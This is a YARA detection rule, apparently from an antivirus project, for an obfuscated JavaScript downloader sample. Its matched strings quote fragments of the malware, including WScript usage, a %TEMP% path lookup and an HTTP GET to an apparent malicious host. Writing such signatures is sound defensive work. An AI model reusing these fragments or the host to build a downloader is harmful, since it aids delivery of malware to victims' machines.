rule sig_20160428_ef6cb7e8326358320208882f47aa53aa {
  meta:
    description = "datamaliciousorder - file 20160428_ef6cb7e8326358320208882f47aa53aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e25d9260a50625a4e2c4d743e62aeead5fc3698005b7f2b2198c251498a70d34"

  strings:
    $s1  = "function BcrOjhBxwAelFsgRuaLoo(EkpLniXswMnxLhmGepRdf){YjrGxiBfzYpeFpoMknLfa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function IfuFhbWbdDxcMtwKqaGhj() {return YjrGxiBfzYpeFpoMknLfa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function BcrOjhBxwAelFsgRuaLoo(EkpLniXswMnxLhmGepRdf){YjrGxiBfzYpeFpoMknLfa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function OezSyfEurZrxIklZxoYax(TeqFmhKkyInnSeyUhqAnt, LyxDxsMltXluWxtBpoFlh){CcxOlpPadOxnXusXmaXdd = CcxOlpPadOxnXusXmaXdd * 1; " ascii
    $s5  = "return TeqFmhKkyInnSeyUhqAnt - LyxDxsMltXluWxtBpoFlh;};" fullword ascii
    $s6  = "RocDonFaeMbmLpsEeiGwp[AhtMhfDjcCumKxlJymMhc](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s7  = "function IfuFhbWbdDxcMtwKqaGhj() {return YjrGxiBfzYpeFpoMknLfa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "var YjrGxiBfzYpeFpoMknLfa = function AjeCyiHcrEhkPpsLycAns() {return GleLdjMxzRjcUtgDxcAzv[JosAjoTjkIppGvkOriAxz](\"WScript\"+\"" ascii
    $s9  = "function KwoMmtPzgBciOeyQukMfv(){return VbuUinWayPelQlcHdqStz + \"\";};" fullword ascii
    $s10 = "if (RocDonFaeMbmLpsEeiGwp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function OezSyfEurZrxIklZxoYax(TeqFmhKkyInnSeyUhqAnt, LyxDxsMltXluWxtBpoFlh){CcxOlpPadOxnXusXmaXdd = CcxOlpPadOxnXusXmaXdd * 1; " ascii
    $s12 = "function ZxaDpgTvlNwaUfxDnoUwh() {return ((SqvUuyFwwNkvDpbUuzRwm == true) && (SqvUuyFwwNkvDpbUuzRwm == KbwJfsUllVcfNrjFtnJtg)) ?" ascii
    $s13 = "function ZxaDpgTvlNwaUfxDnoUwh() {return ((SqvUuyFwwNkvDpbUuzRwm == true) && (SqvUuyFwwNkvDpbUuzRwm == KbwJfsUllVcfNrjFtnJtg)) ?" ascii
    $s14 = "var YjrGxiBfzYpeFpoMknLfa = function AjeCyiHcrEhkPpsLycAns() {return GleLdjMxzRjcUtgDxcAzv[JosAjoTjkIppGvkOriAxz](\"WScript\"+\"" ascii
    $s15 = "var GleLdjMxzRjcUtgDxcAzv = this[\"WScript\"];" fullword ascii
    $s16 = "var XzoXxvUjwLqtTbuKphHxr = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function QcbRnqBbtAkxPrdGkuBvo(){return 23;};" fullword ascii
    $s18 = "KbwJfsUllVcfNrjFtnJtg = true; " fullword ascii
    $s19 = "function DsaCbvIlmQdzIohSnuHhe(RldWwdJmuErnTeaKgkSqi) {var SipDfmFlqEcmWrpIpzJwr = (1, 2, 3, 4, 5, RldWwdJmuErnTeaKgkSqi); retur" ascii
    $s20 = "function GqmOzzFhcUpcPkiJylHuw(){return JosAjoTjkIppGvkOriAxz;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}